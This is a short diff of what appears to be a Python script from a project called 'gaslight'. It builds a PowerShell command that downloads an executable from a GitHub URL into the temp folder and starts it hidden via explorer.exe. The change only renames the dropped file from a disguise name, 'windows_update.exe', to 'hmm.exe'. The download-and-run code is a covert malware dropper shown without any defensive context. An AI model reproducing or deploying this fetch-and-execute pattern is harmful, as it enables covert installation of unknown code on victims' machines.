@@ -7,7 +7,7 @@ executable_url = "https://github.com/davidkennedy02/gaslight/blob/main/dist/hmm.
 # Step 1: Define the PowerShell command to download and run the executable in memory, injected into explorer.exe
 powershell_command = f'''
 $URL = "{executable_url}";
-$Output = "$env:TEMP\\windows_update.exe";
+$Output = "$env:TEMP\\hmm.exe";
 Invoke-WebRequest -Uri $URL -OutFile $Output;
 Start-Process -FilePath "C:\\Windows\\explorer.exe" -ArgumentList "/c start $Output" -WindowStyle Hidden;
 '''
